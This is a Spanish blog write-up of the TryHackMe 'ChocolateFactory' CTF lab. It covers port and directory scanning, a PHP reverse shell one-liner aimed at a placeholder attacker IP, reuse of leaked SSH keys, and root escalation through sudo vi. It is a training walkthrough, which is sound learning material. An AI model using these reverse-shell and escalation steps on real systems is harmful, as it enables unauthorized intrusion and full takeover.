---
title: "ChocolateFactory"
date: 2023-06-04 20:45:23 +0800
categories: [TryHackMe]
tags: [TryHackMe]
---

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-18.png){: width="600"}

<p><center>WriteUp detallado explotando la máquina ChocolateFactory de la plataforma de TryHackMe.</center></p>

**Challenges:**
    
    1. Enter the key you found!

    2. What is Charlie's password?

    3. Change user to charlie

    4. Enter the user flag

    5. Enter the root flag


### Reconocimiento

Iniciamos haciendo un nmap scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.233.236 -oG allPorts
```

Vemos que hay una gran cantidad de `puertos abiertos` con distintos servicios pero no vemos nada interesante.
Intentamos conectarnos por ftp pero no tenemos user ni pass.

![Ports](/assets/img/posts/ChocolateFactoryIMG/image.png){: width="600"}

Esta es la interfaz de la página web

![Interfaz de la página web](/assets/img/posts/ChocolateFactoryIMG/image-1.png){: width="600"}

Viendo su código html de la página vemos que hace un acción en `validate.php` que mas adelante veremos que acá se encuentra la key 

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-2.png){: width="600"}

Con la herramienta `gobuster` vamos a buscar directorios.

```bash
gobuster dir -u http://10.10.233.236/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,py,txt,sh -t 20
```

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-3.png){: width="600"}

Nos dirigimos a esa ruta y vemos lo siguiente

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-4.png){: width="600"}

Una interfaz donde podemos poner comandos y nos da respuesta, entonces aplicaremos un reverse shell.

Usamos una reverse shell para conectarnos y nos ponemos en escucha con netcat `nc -nlvp 443`

```php
php -r '$sock=fsockopen("ATTACKING-IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-5.png){: width="600"}

Estamos dentro de la máquina

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-6.png){: width="600"}

Ahora vamos a buscar en el directorio `/var/www/html/` la `key_rev_key` 

### 1.- Enter the key you found!

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-11.png){: width="600"}

El archivo `teleport` y `teleport.pub` incluyen claves ssh que las usaremos para conectarnos como charlie

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-7.png){: width="600"}

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-8.png){: width="600"}

Copiamos toda la clave y la pasamos a nuestra máquina de atacante y le ponemos de nombre `id_rsa`.

> Podriamos usar *john* para la fuerza bruta y encontrar la contraseña pero por ahi no van los tiros de esta máquina pero siempre es bueno probar todas las maneras posibles para ver como podemos conseguir acceso.

Le damos permiso de lectura al archivo `id_rsa` donde pusimos la key ssh y nos conectamos a través de ssh.

```bash
ssh -i id_rsa charlie@10.10.233.236
```

Entramos a la máquina y vemos que somos el usuario charlie.

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-10.png){: width="600"}

 Ahora tenemos que buscar en los archivos la contraseña de charlie, antes vimos que la página hace una acción que se encuentra en `validate.php` buscamos ahi para encontrar una contraseña que pueda estar en el código ya definida.

Y en efecto encontramos una contraseña en el código

### 2.- Change user to charlie

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-12.png){: width="600"}

Ahora buscamos en el directorio de charlie y buscamos la flag de `user.txt`

### 4.- Enter the user flag

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-9.png){: width="600"}

### Privilege Escalation

Primero vemos que archivos tienen permiso SUID 

```bash
find / -perm -4000 2>/dev/null
```

No encontramos nada relevante donde podemos abusar para escalar nuestro privilegio.

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-14.png){: width="600"}

Siguiente vemos que archivos no necesitan ser root para correr con sudo y encontramos que el `/usr/bin/vi` podemos ejecutar

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-13.png){: width="600"}

Entramos a [gtfobins](https://gtfobins.github.io/) y buscamos el comando que nos hará escalar privilegios al usuario root

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-15.png){: width="600"}

Ejecutamos y listo somos root

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-16.png){: width="600"}

En el directorio de root vemos que tenemos un archivo llamado `root.py` ejecutamos dicho archivo y nos pide una key. Es la misma key que encontramos al inicio en el directorio `/var/www/html`.

### 5.- Enter the root flag

![alt text](/assets/img/posts/ChocolateFactoryIMG/image-17.png){: width="600"}

¡¡Obtenemos una flag, al ejecutar el código de python!!

¡Ahora que tenemos todas nuestras respuestas, enviémoslas y hemos completado con éxito nuestro CTF!

Sigue intentándolo, sigue trabajando :)

¡Gracias por leer!

Feliz Hacking :D

¡Sígueme más para obtener más consejos y trucos! 🙏

```
Autor: rxsh
```